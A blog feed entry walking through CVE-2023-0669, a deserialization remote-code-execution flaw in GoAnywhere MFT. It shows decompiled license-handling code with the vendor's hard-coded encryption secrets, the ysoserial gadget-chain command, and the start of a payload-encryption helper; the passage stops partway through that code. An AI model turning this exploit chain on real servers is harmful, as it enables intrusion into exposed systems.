<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-03-03T15:07:33-08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">yosef0x1’s Blog</title><subtitle>&lt;p style=&quot;text-align: center;&quot;&gt;Hackthebox Write ups &amp;&amp; CTF and some Research Stuff.&lt;/p&gt;
</subtitle><author><name>Youssef Muhammad</name></author><entry><title type="html">RCE in Goanywhere</title><link href="http://localhost:4000/2023/12/17/Unauthenticated-RCE-in-Goanywhere.html" rel="alternate" type="text/html" title="RCE in Goanywhere" /><published>2023-12-17T00:00:00-08:00</published><updated>2023-12-17T00:00:00-08:00</updated><id>http://localhost:4000/2023/12/17/Unauthenticated-RCE-in-Goanywhere</id><content type="html" xml:base="http://localhost:4000/2023/12/17/Unauthenticated-RCE-in-Goanywhere.html"><![CDATA[<h1 id="introduction">Introduction</h1>

<p><strong>CVE-2023-0669</strong> is an insecure deserialization vulnerability that leads to code execution in the system (RCE). It has been discovered in GoAnywhere MFT versions 7.1.1 for Windows and 7.0.3 for Linux, which are utilized as secure file transfer solutions to carry out automated file transfer activities securely. This bug has been deemed highly dangerous and potentially a zero-day vulnerability as some organizations have left the Admin</p>

<p>portal exposed to the internet.</p>

<p>based on <a href="https://www.shodan.io/">Shodan.io (IoT</a> search engine) It appears that there are over 999 administrative consoles publicly exposed to the internet, leaving them exploitable if they didn’t mitigate the CVE or update the application yet</p>

<p><img src="/public/media/1.png" /></p>

<h2 id="building-our-testing-lab">Building our Testing Lab</h2>

<ol>
  <li>let’s first install the app in our operation system  note the app support serval operations systems because it’s depends on java installation ,run the app and check if it work by visiting the  localhost and it’s by default run on</li>
</ol>

<p>port 8000</p>

<p><img src="/public/media/2.jpeg" /></p>

<p>Getting the vulnerable app can be difficult, especially if the vendor does not have an archive for the older versions of the app so the vulnerable version for Linux can be found at this link</p>

<ol>
  <li>Download the following tools that are used in the analysis, Jadx for the decompiling<a href="https://github.com/skylot/jadx"> (reverse-engineering) </a>the application, ysoserial<a href="https://github.com/frohoff/ysoserial"> for exploiting</a> the insecure deserialization  note: serial required old JDK 8 to 15 and <a href="https://jdk.java.net/archive/">JDK</a> for the java Environment</li>
</ol>

<h2 id="obtaining-the-java-source-code">Obtaining the Java source code</h2>

<p>Reverse engineering for Java bytecode and other types of code includes two methods: disassembling and</p>

<p>decompiling. Disassembling converts bytecode into a lower-level format, such as assembly code, which can be more difficult to read and understand. However, it is useful for other types of code, such as C and C++. On the other hand, decompiling includes converting bytecode back into its original high-level source code, which can include class and method names, making it easier to understand. By using these methods, it is possible to obtain similar code to the original code, although the decompiled code may not be identical to the original source code</p>

<p>By decompiling Java bytecode using tools like Jadx, we can reverse engineer the code and obtain its original Java source code</p>

<p><img src="/public/media/3.jpeg" /></p>

<p>Java bytecode is the compiled version of Java source code, which is executed by the Java Virtual Machine  (JVM) and enables Java applications to be cross-platform compatible. However, this binary code can still be reverse- engineered back to the original code. This process is called decompiling the app, as we explained earlier. Decompiling is possible because the bytecode retains some high-level structures such as class and method names, as well as variable names</p>

<p>Although it is not intended to be difficult to reverse, developers can protect their code by using an</p>

<p>obfuscation technique that makes it harder to understand and reverse-engineer. Moreover, to avoid exposing sensitive information or keys in the code, developers can store such data separately and retrieve it dynamically during runtime.</p>

<p>To understand how the  GoAnywhere MFT app works, we need to dive into its underlying web framework that uses the</p>

<p>Servlet API - a Java web application programming interface,</p>

<p>The  web.xml file, located in the  WEB-INF directory, is a critical component of the application’s deployment descriptor, containing crucial information such as servlet mappings and security configurations.</p>

<p>The CVE Description focuses on a vulnerability in the License Response handling of GoAnywhere MFT. To address it, we need to review the  web.xml file and reverse engineer or decompile the</p>

<p><code class="language-plaintext highlighter-rouge">com.linoma.ga.ui.admin.servlet.licenseResponseServlet</code> class.
<img src="/public/media/4.png" /></p>

<p>To investigate the  licenseResponseServlet class, we have to dive into the  lib files of the GoAnywhere MFT application. These files contain various libraries and packages used by the application. We can load all the files in this directory and use a tool like Jadx string searching to locate the desired class. but I have found that the required class is located within the  ga_classes.jar package by loading this file into Jadx tool</p>

<p><img src="/public/media/5.jpeg" /></p>

<p>It was mentioned earlier that there is a bug in how the application handles licenses. Therefore, we need to dive
deep into the code to understand how the app handles licenses. in  LicenseResponseServlet we found this code</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">LicenseResponseServlet</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span>
<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="n">serialVersionUID</span> <span class="o">=</span> <span class="o">-</span><span class="mi">441307309120983773L</span><span class="o">;</span>

<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">Logger</span> <span class="no">LOGGER</span> <span class="o">=</span> <span class="nc">LoggerFactory</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="nc">LicenseResponseServlet</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>

<span class="kd">public</span> <span class="kt">void</span> <span class="nf">doPost</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">httpServletRequest</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">httpServletResponse</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span> <span class="o">{</span>
    <span class="nc">Response</span> <span class="n">response</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>

    <span class="k">try</span> <span class="o">{</span>
        <span class="n">response</span> <span class="o">=</span> <span class="nc">LicenseAPI</span><span class="o">.</span><span class="na">getResponse</span><span class="o">(</span><span class="n">httpServletRequest</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"bundle"</span><span class="o">));</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="no">LOGGER</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">"Error parsing license response"</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
        <span class="n">httpServletResponse</span><span class="o">.</span><span class="na">sendError</span><span class="o">((</span><span class="kt">int</span><span class="o">)</span> <span class="nc">FtpReply</span><span class="o">.</span><span class="na">REPLY_500_SYNTAX_ERROR_COMMAND_UNRECOGNIZED</span><span class="o">);</span>
        <span class="k">return</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="n">httpServletRequest</span><span class="o">.</span><span class="na">getSession</span><span class="o">().</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"LicenseResponse"</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
    <span class="n">httpServletRequest</span><span class="o">.</span><span class="na">getSession</span><span class="o">().</span><span class="na">setAttribute</span><span class="o">(</span><span class="nc">NavigationConstants</span><span class="o">.</span><span class="na">SESSION_GOTO_OUTCOME</span><span class="o">,</span> <span class="nc">NavigationConstants</span><span class="o">.</span><span class="na">ADMIN_LICENSE_OUTCOME</span><span class="o">);</span>

    <span class="nc">String</span> <span class="n">redirectUrl</span> <span class="o">=</span> <span class="n">httpServletRequest</span><span class="o">.</span><span class="na">getScheme</span><span class="o">()</span> <span class="o">+</span> <span class="s">"://"</span> <span class="o">+</span> <span class="n">httpServletRequest</span><span class="o">.</span><span class="na">getServerName</span><span class="o">()</span> <span class="o">+</span>
            <span class="nc">IAMConstants</span><span class="o">.</span><span class="na">SEP</span> <span class="o">+</span> <span class="n">httpServletRequest</span><span class="o">.</span><span class="na">getServerPort</span><span class="o">()</span> <span class="o">+</span>
            <span class="nc">ProductInformation</span><span class="o">.</span><span class="na">PRODUCT_MAIN_CONTEXT_PATH</span> <span class="o">+</span> <span class="nc">AdminPageURL</span><span class="o">.</span><span class="na">LICENSE</span><span class="o">;</span>

    <span class="n">httpServletResponse</span><span class="o">.</span><span class="na">sendRedirect</span><span class="o">(</span><span class="n">redirectUrl</span><span class="o">);</span>
<span class="o">}</span>

<span class="kd">public</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">httpServletRequest</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">httpServletResponse</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span> <span class="o">{</span>
    <span class="n">doPost</span><span class="o">(</span><span class="n">httpServletRequest</span><span class="o">,</span> <span class="n">httpServletResponse</span><span class="o">);</span>
<span class="o">}</span>

</code></pre></div></div>

<p>so here’s the deal with this Java servlet code. It’s handling web requests using  doPost and pulling in the</p>

<p>bundle parameter which is  licenseServer.BUNDLE_param . Then it tries to get a  response using  LicenseAPI and catches any errors with a  try-catch . If it fails, the servlet sends a  500 error response. If it succeeds, the  response and objects are saved in the user’s session and they’re redirected to the license page. By checking out the</p>

<p>NavigationConstants class, I discovered the endpoint that accepts the license  /lic/accept</p>

<p><code class="language-plaintext highlighter-rouge">public static final String ADMIN\_SERVLET\_LICENSE\_ACCEPT\_PATH = "/lic/accept";</code></p>

<p>When trying to access the endpoint, I get a  500 error status code but it’s still existed</p>

<p><img src="/public/media/6.jpeg" /></p>

<p>Now that we have a basic understanding of how the software handles the  bundle request and its logic, let’s dive deeper to see how the app handles licenses, including encryption.</p>

<p>To do this, we can decompile the  <code class="language-plaintext highlighter-rouge">licenseapi-2.0.jar</code> package from the lib directory and examine the classes. One class that catches my attention is  BundleWorker , which appears to handle things related to the bundle parameter, By analyzing the unbundle method code, we will understand how it works</p>
<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">unbundle</span><span class="o">(</span><span class="nc">String</span> <span class="n">base64</span><span class="o">,</span> <span class="nc">KeyConfig</span> <span class="n">keyConfig</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">BundleException</span> <span class="o">{</span>
<span class="k">try</span> <span class="o">{</span>  

<span class="k">if</span> <span class="o">(!</span><span class="s">"1"</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">keyConfig</span><span class="o">.</span><span class="na">getVersion</span><span class="o">()))</span> <span class="o">{</span>  

    <span class="n">base64</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">base64</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="s">"$"</span><span class="o">));</span>  

<span class="o">}</span>  

<span class="kt">byte</span><span class="o">[]</span> <span class="n">data</span> <span class="o">=</span> <span class="n">decode</span><span class="o">(</span><span class="n">base64</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="no">CHARSET</span><span class="o">));</span>  

<span class="k">return</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="n">decompress</span><span class="o">(</span><span class="n">verify</span><span class="o">(</span><span class="n">decrypt</span><span class="o">(</span><span class="n">data</span><span class="o">,</span> <span class="n">keyConfig</span><span class="o">.</span><span class="na">getVersion</span><span class="o">()),</span> <span class="n">keyConfig</span><span class="o">)),</span> <span class="no">CHARSET</span><span class="o">);</span>
</code></pre></div></div>

<p>``
Next, the data is decoded using Base64 and passed to the  decrypt and  verify methods. Before decrypting, let’s take a closer look at the  decrypt method</p>

<p>loaded from: <code class="language-plaintext highlighter-rouge">licenseapi-2.0.jar:com/linoma/license/gen2/LicenseEncryptor.class</code></p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">LicenseEncryptor</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">VERSION_1</span> <span class="o">=</span> <span class="s">"1"</span><span class="o">;</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">VERSION_2</span> <span class="o">=</span> <span class="s">"2"</span><span class="o">;</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">byte</span><span class="o">[]</span> <span class="no">IV</span> <span class="o">=</span> <span class="o">{</span><span class="mi">65</span><span class="o">,</span> <span class="mi">69</span><span class="o">,</span> <span class="mi">83</span><span class="o">,</span> <span class="mi">47</span><span class="o">,</span> <span class="mi">67</span><span class="o">,</span> <span class="mi">66</span><span class="o">,</span> <span class="mi">67</span><span class="o">,</span> <span class="mi">47</span><span class="o">,</span> <span class="mi">80</span><span class="o">,</span> <span class="mi">75</span><span class="o">,</span> <span class="mi">67</span><span class="o">,</span> <span class="mi">83</span><span class="o">,</span> <span class="mi">53</span><span class="o">,</span> <span class="mi">80</span><span class="o">,</span> <span class="mi">97</span><span class="o">,</span> <span class="mi">100</span><span class="o">};</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">KEY_ALGORITHM</span> <span class="o">=</span> <span class="s">"AES"</span><span class="o">;</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">CIPHER_ALGORITHM</span> <span class="o">=</span> <span class="s">"AES/CBC/PKCS5Padding"</span><span class="o">;</span>

    <span class="kd">private</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">getInitializationValue</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">param1</span> <span class="o">=</span> <span class="o">{</span><span class="mi">103</span><span class="o">,</span> <span class="mi">111</span><span class="o">,</span> <span class="mi">64</span><span class="o">,</span> <span class="mi">110</span><span class="o">,</span> <span class="mi">121</span><span class="o">,</span> <span class="mi">119</span><span class="o">,</span> <span class="mi">104</span><span class="o">,</span> <span class="mi">101</span><span class="o">,</span> <span class="mi">114</span><span class="o">,</span> <span class="mi">101</span><span class="o">,</span> <span class="mi">76</span><span class="o">,</span> <span class="mi">105</span><span class="o">,</span> <span class="mi">99</span><span class="o">,</span> <span class="mi">101</span><span class="o">,</span> <span class="mi">110</span><span class="o">,</span> <span class="mi">115</span><span class="o">,</span> <span class="mi">101</span><span class="o">,</span> <span class="mi">80</span><span class="o">,</span> <span class="mi">64</span><span class="o">,</span> <span class="mi">36</span><span class="o">,</span> <span class="mi">36</span><span class="o">,</span> <span class="mi">119</span><span class="o">,</span> <span class="mi">114</span><span class="o">,</span> <span class="mi">100</span><span class="o">};</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">param2</span> <span class="o">=</span> <span class="o">{-</span><span class="mi">19</span><span class="o">,</span> <span class="mi">45</span><span class="o">,</span> <span class="o">-</span><span class="mi">32</span><span class="o">,</span> <span class="o">-</span><span class="mi">73</span><span class="o">,</span> <span class="mi">65</span><span class="o">,</span> <span class="mi">123</span><span class="o">,</span> <span class="o">-</span><span class="mi">7</span><span class="o">,</span> <span class="mi">85</span><span class="o">};</span>
        <span class="nc">SecretKeyFactory</span> <span class="n">factory</span> <span class="o">=</span> <span class="nc">SecretKeyFactory</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"PBKDF2WithHmacSHA1"</span><span class="o">);</span>
        <span class="nc">KeySpec</span> <span class="n">spec</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PBEKeySpec</span><span class="o">(</span><span class="k">new</span> <span class="nc">String</span><span class="o">(</span><span class="n">param1</span><span class="o">,</span> <span class="nc">StandardCharsets</span><span class="o">.</span><span class="na">UTF_8</span><span class="o">).</span><span class="na">toCharArray</span><span class="o">(),</span> <span class="n">param2</span><span class="o">,</span> <span class="mi">9535</span><span class="o">,</span> <span class="mi">256</span><span class="o">);</span>
        <span class="nc">SecretKey</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">factory</span><span class="o">.</span><span class="na">generateSecret</span><span class="o">(</span><span class="n">spec</span><span class="o">);</span>
        <span class="k">return</span> <span class="n">tmp</span><span class="o">.</span><span class="na">getEncoded</span><span class="o">();</span>
    <span class="o">}</span>

    <span class="kd">private</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">getInitializationValueV2</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">param1</span> <span class="o">=</span> <span class="o">{</span><span class="mi">112</span><span class="o">,</span> <span class="mi">70</span><span class="o">,</span> <span class="mi">82</span><span class="o">,</span> <span class="mi">103</span><span class="o">,</span> <span class="mi">114</span><span class="o">,</span> <span class="mi">79</span><span class="o">,</span> <span class="mi">77</span><span class="o">,</span> <span class="mi">104</span><span class="o">,</span> <span class="mi">97</span><span class="o">,</span> <span class="mi">117</span><span class="o">,</span> <span class="mi">117</span><span class="o">,</span> <span class="mi">115</span><span class="o">,</span> <span class="mi">89</span><span class="o">,</span> <span class="mi">50</span><span class="o">,</span> <span class="mi">90</span><span class="o">,</span> <span class="mi">68</span><span class="o">,</span> <span class="mi">83</span><span class="o">,</span> <span class="mi">104</span><span class="o">,</span> <span class="mi">84</span><span class="o">,</span> <span class="mi">115</span><span class="o">,</span> <span class="mi">113</span><span class="o">,</span> <span class="mi">113</span><span class="o">,</span> <span class="mi">50</span><span class="o">,</span> <span class="mi">111</span><span class="o">,</span> <span class="mi">90</span><span class="o">,</span> <span class="mi">88</span><span class="o">,</span> <span class="mi">75</span><span class="o">,</span> <span class="mi">116</span><span class="o">,</span> <span class="mi">111</span><span class="o">,</span> <span class="mi">87</span><span class="o">,</span> <span class="mi">55</span><span class="o">,</span> <span class="mi">82</span><span class="o">};</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">param2</span> <span class="o">=</span> <span class="o">{</span><span class="mi">99</span><span class="o">,</span> <span class="mi">76</span><span class="o">,</span> <span class="mi">71</span><span class="o">,</span> <span class="mi">87</span><span class="o">,</span> <span class="mi">49</span><span class="o">,</span> <span class="mi">74</span><span class="o">,</span> <span class="mi">119</span><span class="o">,</span> <span class="mi">83</span><span class="o">,</span> <span class="mi">109</span><span class="o">,</span> <span class="mi">112</span><span class="o">,</span> <span class="mi">50</span><span class="o">,</span> <span class="mi">75</span><span class="o">,</span> <span class="mi">104</span><span class="o">,</span> <span class="mi">107</span><span class="o">,</span> <span class="mi">56</span><span class="o">,</span> <span class="mi">73</span><span class="o">};</span>
        <span class="nc">SecretKeyFactory</span> <span class="n">factory</span> <span class="o">=</span> <span class="nc">SecretKeyFactory</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"PBKDF2WithHmacSHA1"</span><span class="o">);</span>
        <span class="nc">KeySpec</span> <span class="n">spec</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PBEKeySpec</span><span class="o">(</span><span class="k">new</span> <span class="nc">String</span><span class="o">(</span><span class="n">param1</span><span class="o">,</span> <span class="nc">StandardCharsets</span><span class="o">.</span><span class="na">UTF_8</span><span class="o">).</span><span class="na">toCharArray</span><span class="o">(),</span> <span class="n">param2</span><span class="o">,</span> <span class="mi">3392</span><span class="o">,</span> <span class="mi">256</span><span class="o">);</span>
        <span class="nc">SecretKey</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">factory</span><span class="o">.</span><span class="na">generateSecret</span><span class="o">(</span><span class="n">spec</span><span class="o">);</span>
        <span class="k">return</span> <span class="n">tmp</span><span class="o">.</span><span class="na">getEncoded</span><span class="o">();</span>
    <span class="o">}</span>
<span class="o">}</span>

</code></pre></div></div>

<p>simply the code contain some values and as we see it’s use two different versions and this versions have diffrenet format, and using  getInitializationValue() method to generate secert IV using techinquies called password- based-key derviation which is take a password and the sult value and use them to derive a secert key that used to genreate the IV and the  getInitializationValueV2() method do the same with the  v2 of the license</p>

<p>As shown in this piece of code, it uses the Advanced Encryption Standard (AES) algorithm, which is a  symmetric encryption algorithm which this means that the same key is used for both encryption and decryption. this will be helpful in our code when we need to encrypt our final payload. We can extract this code and create a custom java script to assist us in encrypting our serialized payload which will be the output of  ysoserial tool .</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">verify</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">data</span><span class="o">,</span> <span class="nc">KeyConfig</span> <span class="n">keyConfig</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span><span class="o">,</span> <span class="nc">ClassNotFoundException</span><span class="o">,</span> <span class="nc">NoSuchAlgorithmException</span><span class="o">,</span> <span class="nc">InvalidKeyException</span><span class="o">,</span> <span class="nc">SignatureException</span><span class="o">,</span> <span class="nc">UnrecoverableKeyException</span><span class="o">,</span> <span class="nc">CertificateException</span><span class="o">,</span> <span class="nc">KeyStoreException</span> 
<span class="nc">ObjectInputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>

<span class="k">try</span> <span class="o">{</span>
    <span class="nc">String</span> <span class="n">algorithm</span> <span class="o">=</span> <span class="s">"SHA1withDSA"</span><span class="o">;</span>

    <span class="k">if</span> <span class="o">(</span><span class="s">"2"</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">keyConfig</span><span class="o">.</span><span class="na">getVersion</span><span class="o">()))</span> <span class="o">{</span>
        <span class="n">algorithm</span> <span class="o">=</span> <span class="s">"SHA512withRSA"</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="nc">PublicKey</span> <span class="n">verificationKey</span> <span class="o">=</span> <span class="n">getPublicKey</span><span class="o">(</span><span class="n">keyConfig</span><span class="o">);</span>

    <span class="k">try</span> <span class="o">(</span><span class="nc">ObjectInputStream</span> <span class="n">in2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">ByteArrayInputStream</span><span class="o">(</span><span class="n">data</span><span class="o">)))</span> <span class="o">{</span>
        <span class="nc">SignedObject</span> <span class="n">signedLicense</span> <span class="o">=</span> <span class="o">(</span><span class="nc">SignedObject</span><span class="o">)</span> <span class="n">in2</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
        <span class="nc">Signature</span> <span class="n">signature</span> <span class="o">=</span> <span class="nc">Signature</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="n">algorithm</span><span class="o">);</span>

        <span class="kt">boolean</span> <span class="n">verified</span> <span class="o">=</span> <span class="n">signedLicense</span><span class="o">.</span><span class="na">verify</span><span class="o">(</span><span class="n">verificationKey</span><span class="o">,</span> <span class="n">signature</span><span class="o">);</span>

        <span class="k">if</span> <span class="o">(!</span><span class="n">verified</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nf">IOException</span><span class="o">(</span><span class="s">"Unable to verify signature!"</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="nc">SignedContainer</span> <span class="n">sc</span> <span class="o">=</span> <span class="o">(</span><span class="nc">SignedContainer</span><span class="o">)</span> <span class="n">signedLicense</span><span class="o">.</span><span class="na">getObject</span><span class="o">();</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">data2</span> <span class="o">=</span> <span class="n">sc</span><span class="o">.</span><span class="na">getData</span><span class="o">();</span>

        <span class="k">return</span> <span class="n">data2</span><span class="o">;</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Throwable</span> <span class="n">th</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="n">th</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">in</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">in</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">throw</span> <span class="n">e</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>

</code></pre></div></div>

<p>simply there is the method called  verify reading the  data byte array and a  KeyConfig object and determines the algorithm based on version which is licenses v2 containing  $2 in the request and retrieving the public key to verify the of license data and Deserialize  data bytes by  readObject as a bytes array</p>

<h3 id="the-root-case">The Root Case</h3>

<p>because  readObject java method is the main of the deserialization attacks because it’s responsible for deserializing objects from  ObjectInputStream methods which are dangerous and has security risk when it is</p>

<p>controlled by the user without proper validation and leads the bad actor to execute code in the system by gadget chain which is java libraries or classes the application using can manipulated by the attacker to Malicious Code there are many types to detect it like in our CVE</p>

<h2 id="building-the-exploit">Building the Exploit</h2>

<h3 id="the-gadget-chain">The Gadget Chain</h3>

<p>the Gadget Chain in our case because of this lib  Commons-beanutils-1.9.4.jar the insecure Deserialization can lead to arbitrary code execution by changing the flow of execution to trigger a runtime.exe to achieve our goal RCE</p>

<p><img src="/public/media/7.png" /></p>

<p>An important note here that Insecure deserialization doesn’t always lead to remote code execution (RCE) because it’s depends on the dependencies on the application use and the deserialized data, but it can still lead to other types of attacks like denial of service or information disclosure or object injection when the attacker manipulates to perform attacks such as editing the admin permission or attacks like Privilege escalation</p>

<p>using  ysoserial to create our serialized payload to get RCE by the following structure</p>

<p>java -jar ysoserial-all.jar Payload “command”</p>

<p>payload :is known Dependencies the app using can get by RCE command : the command that will be executed on the system</p>

<p>as shows in the following picture from ysoserial-all usage documentation  commons-beanutils is including in</p>

<p>CommonBeanuils1 payload</p>

<p><img src="/public/media/8.png" /></p>

<p>It’s time to exploit this vulnerability</p>

<p>We need to encrypt the payload before sending it. To achieve this, we can use the encryption part from the tool available at <a href="https://github.com/0xf4n9x/CVE-2023-0669%5D\(https://github.com/0xf4n9x/CVE-2023-0669\)">[https://github.com/0xf4n9x/CVE-2023-0669](https://github.com/0xf4n9x/CVE-2023-0669). However, we </a>will need to make some modifications on the tool</p>

<p>to take the file_path and the version as argument from the user and decrypt the payload</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.crypto.Cipher</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.nio.charset.StandardCharsets</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.crypto.SecretKeyFactory</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.crypto.spec.PBEKeySpec</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.crypto.spec.IvParameterSpec</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.crypto.spec.SecretKeySpec</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.nio.file.Files</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.nio.file.Paths</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CVE_2023_0669_helper</span> <span class="o">{</span>

    <span class="kd">static</span> <span class="nc">String</span> <span class="no">ALGORITHM</span> <span class="o">=</span> <span class="s">"AES/CBC/PKCS5Padding"</span><span class="o">;</span>
    <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="no">KEY</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">30</span><span class="o">];</span>
    <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="no">IV</span> <span class="o">=</span> <span class="s">"AES/CBC/PKCS5Pad"</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="nc">StandardCharsets</span><span class="o">.</span><span class="na">UTF_8</span><span class="o">);</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">args</span><span class="o">.</span><span class="na">length</span> <span class="o">!=</span> <span class="mi">2</span><span class="o">)</span> <span class="o">{</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Usage: java CVE_2023_0669_helper &lt;file_path&gt; &lt;version&gt;"</span><span class="o">);</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">exit</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="nc">String</span> <span class="n">filePath</span> <span class="o">=</span> <span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span>
        <span class="nc">String</span> <span class="n">version</span> <span class="o">=</span> <span class="n">args</span><span class="o">[</span><span class="mi">1</span><span class="o">];</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">fileContent</span> <span class="o">=</span> <span class="nc">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="nc">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">filePath</span><span class="o">));</span>
        <span class="nc">String</span> <span class="n">encryptedContent</span> <span class="o">=</span> <span class="n">encrypt</span><span class="o">(</span><span class="n">fileContent</span><span class="o">,</span> <span class="n">version</span><span class="o">);</span>
